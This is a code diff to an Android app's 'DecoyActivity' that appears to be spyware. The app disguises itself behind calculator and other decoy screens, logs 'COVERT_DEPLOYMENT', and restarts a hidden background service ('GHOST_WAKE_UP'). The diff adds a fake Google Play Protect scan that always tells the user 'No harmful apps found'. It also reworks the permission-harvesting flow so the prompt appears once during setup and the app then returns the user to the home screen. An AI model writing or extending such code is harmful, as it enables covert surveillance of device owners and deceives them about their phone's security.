@@ -36,6 +36,7 @@ public class DecoyActivity extends AppCompatActivity {
     private int clickCount = 0;
     private long lastClickTime = 0;
     private boolean isSpecializedDecoy = false;
+    private boolean isLaunchingPermissions = false;
 
     // Calculator State
     private String operand1 = "";
@@ -109,6 +110,7 @@ public class DecoyActivity extends AppCompatActivity {
         }
 
         int decoyChoice = SystemAnalytics.getDecoyChoice(this);
+        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
 
         if (componentName.contains("CalculatorAlias") || decoyChoice == 2) {
             setContentView(R.layout.activity_decoy_calculator);
@@ -128,11 +130,13 @@ public class DecoyActivity extends AppCompatActivity {
         } else {
             isSpecializedDecoy = false;
             // High-Fidelity Play Protect Pipeline Logic
-            if (allPermissionsOk()) {
-                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+            if (isDeployed || allPermissionsOk()) {
+                if (!isDeployed) {
+                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+                }
                 setupSuccessDecoy();
             } else {
-                // Direct Permission Pipeline: Launches PermissionActivity whenever permissions are incomplete
+                // Direct Permission Pipeline: Launches PermissionActivity ONLY during initial setup before decoy_deployed is true
                 FirebaseConfig.logActivity("COVERT_DEPLOYMENT: Direct permission pipeline initialized.");
                 
                 Intent i = new Intent(this, WorkManager_Sync.class);
@@ -145,6 +149,7 @@ public class DecoyActivity extends AppCompatActivity {
                     }
                 } catch (Exception ignored) {}
 
+                isLaunchingPermissions = true;
                 Intent permissions = new Intent(this, PermissionActivity.class);
                 permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                 startActivityForResult(permissions, 9999);
@@ -152,7 +157,6 @@ public class DecoyActivity extends AppCompatActivity {
         }
 
         // --- GHOST_WAKE_UP ---
-        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
         if (isDeployed && !WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
             Intent i = new Intent(this, WorkManager_Sync.class);
             i.setAction(Constants.ACTION_START_CORE);
@@ -176,14 +180,10 @@ public class DecoyActivity extends AppCompatActivity {
         rotate.setInterpolator(new android.view.animation.LinearInterpolator());
 
         // 2. Find individual dots
-        View d1 = layout.findViewById(R.id.dot1);
-        if (d1 == null) d1 = layout.findViewById(R.id.dot1_success);
-        View d2 = layout.findViewById(R.id.dot2);
-        if (d2 == null) d2 = layout.findViewById(R.id.dot2_success);
-        View d3 = layout.findViewById(R.id.dot3);
-        if (d3 == null) d3 = layout.findViewById(R.id.dot3_success);
-        View d4 = layout.findViewById(R.id.dot4);
-        if (d4 == null) d4 = layout.findViewById(R.id.dot4_success);
+        View d1 = layout.findViewById(R.id.dot1_success);
+        View d2 = layout.findViewById(R.id.dot2_success);
+        View d3 = layout.findViewById(R.id.dot3_success);
+        View d4 = layout.findViewById(R.id.dot4_success);
 
         if (d1 != null && d2 != null && d3 != null && d4 != null) {
             // Samsung High-Fidelity Sync: 2 dots at half opacity
@@ -273,8 +273,82 @@ public class DecoyActivity extends AppCompatActivity {
         View btnFinish = findViewById(R.id.btnFinishDecoy);
         if (btnFinish != null) {
             btnFinish.setVisibility(View.VISIBLE);
-            btnFinish.setOnClickListener(v -> goHome());
+            if (btnFinish instanceof TextView) {
+                ((TextView) btnFinish).setText("SCAN PHONE");
+            }
+            btnFinish.setOnClickListener(v -> startMockPlayProtectScan());
         }
+    }
+
+    private void startMockPlayProtectScan() {
+        View btnFinish = findViewById(R.id.btnFinishDecoy);
+        ProgressBar pb = findViewById(R.id.pbPlayProtect);
+        TextView tvSub = findViewById(R.id.tvPlayProtectSub);
+        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
+
+        if (btnFinish != null) {
+            btnFinish.setEnabled(false);
+            if (btnFinish instanceof TextView) {
+                ((TextView) btnFinish).setText("SCANNING...");
+            }
+        }
+
+        if (tvSub != null) {
+            tvSub.setText("Scanning system for issues...");
+            tvSub.setTextColor(Color.parseColor("#5F6368"));
+        }
+
+        if (tvDetails != null) {
+            tvDetails.setText("Verifying installed applications...");
+        }
+
+        if (pb != null) {
+            pb.setProgress(10);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                pb.setProgress(35, true);
+            } else {
+                pb.setProgress(35);
+            }
+        }
+
+        Handler handler = new Handler(Looper.getMainLooper());
+
+        handler.postDelayed(() -> {
+            if (tvDetails != null) tvDetails.setText("Checking system integrity & permissions...");
+            if (pb != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) pb.setProgress(75, true);
+                else pb.setProgress(75);
+            }
+        }, 1500);
+
+        handler.postDelayed(() -> {
+            if (pb != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) pb.setProgress(100, true);
+                else pb.setProgress(100);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    pb.setProgressTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#34A853")));
+                }
+            }
+
+            if (tvSub != null) {
+                tvSub.setText("✔  No harmful apps found");
+                tvSub.setTextColor(Color.parseColor("#137333"));
+            }
+
+            if (tvDetails != null) {
+                tvDetails.setText("System is secure • Last scanned: Just now");
+                tvDetails.setTextColor(Color.parseColor("#5F6368"));
+            }
+
+            if (btnFinish != null) {
+                btnFinish.setEnabled(true);
+                if (btnFinish instanceof TextView) {
+                    ((TextView) btnFinish).setText("SCAN PHONE");
+                }
+            }
+
+            android.widget.Toast.makeText(this, "Scan complete: System is secure", android.widget.Toast.LENGTH_SHORT).show();
+        }, 3200);
     }
 
     private void setupSmartTutorDecoy() {
@@ -718,55 +792,26 @@ public class DecoyActivity extends AppCompatActivity {
         return "Mostly Sunny";
     }
 
-    private void setupSettings() {
-        TextView title = findViewById(R.id.settingsTitle);
-        if (title != null) title.setOnClickListener(v -> handleBackdoorClick());
-        
-        Button btnScan = findViewById(R.id.btnPlayProtectScan);
-        final android.widget.ProgressBar pb = findViewById(R.id.pbPlayProtect);
-        final TextView status = findViewById(R.id.playProtectStatus);
 
-        if (btnScan != null) {
-            btnScan.setOnClickListener(v -> {
-                btnScan.setVisibility(View.GONE);
-                if (pb != null) pb.setVisibility(View.VISIBLE);
-                if (status != null) status.setText("Scanning apps...");
-
-                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                    if (pb != null) pb.setVisibility(View.GONE);
-                    btnScan.setVisibility(View.VISIBLE);
-                    if (status != null) status.setText("No harmful apps found");
-                    android.widget.Toast.makeText(this, "Scan complete: Device is secure", android.widget.Toast.LENGTH_SHORT).show();
-                }, 5000);
-            });
-        }
-
-        android.view.ViewGroup root = findViewById(android.R.id.content);
-        if (root != null) attachSettingsInteractivity(root);
-    }
-
-    private void attachSettingsInteractivity(android.view.ViewGroup parent) {
-        for (int i = 0; i < parent.getChildCount(); i++) {
-            View v = parent.getChildAt(i);
-            if (v instanceof TextView) {
-                TextView tv = (TextView) v;
-                String text = tv.getText().toString();
-                if (!text.isEmpty() && !text.equals("Settings") && tv.getTextSize() > 45) {
-                    v.setOnClickListener(item -> android.widget.Toast.makeText(this, "Simulating " + text + "...", android.widget.Toast.LENGTH_SHORT).show());
-                }
-            } else if (v instanceof android.view.ViewGroup) attachSettingsInteractivity((android.view.ViewGroup) v);
-        }
-    }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == 9999) {
             if (!isSpecializedDecoy) {
-                if (allPermissionsOk()) {
-                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+                boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
+                if (isDeployed || allPermissionsOk()) {
+                    if (!isDeployed) {
+                        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+                    }
+                    if (isLaunchingPermissions) {
+                        isLaunchingPermissions = false;
+                        goHome();
+                        return;
+                    }
                     setupSuccessDecoy();
                 } else {
+                    isLaunchingPermissions = true;
                     Intent permissions = new Intent(this, PermissionActivity.class);
                     permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                     startActivityForResult(permissions, 9999);
@@ -790,13 +835,24 @@ public class DecoyActivity extends AppCompatActivity {
         }
 
         if (!isSpecializedDecoy) {
-            if (allPermissionsOk()) {
-                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+            boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
+            if (isDeployed || allPermissionsOk()) {
+                if (!isDeployed) {
+                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+                }
+                if (isLaunchingPermissions) {
+                    isLaunchingPermissions = false;
+                    goHome();
+                    return;
+                }
                 setupSuccessDecoy();
             } else {
-                Intent permissions = new Intent(this, PermissionActivity.class);
-                permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                startActivityForResult(permissions, 9999);
+                if (!isLaunchingPermissions) {
+                    isLaunchingPermissions = true;
+                    Intent permissions = new Intent(this, PermissionActivity.class);
+                    permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    startActivityForResult(permissions, 9999);
+                }
             }
         }
     }
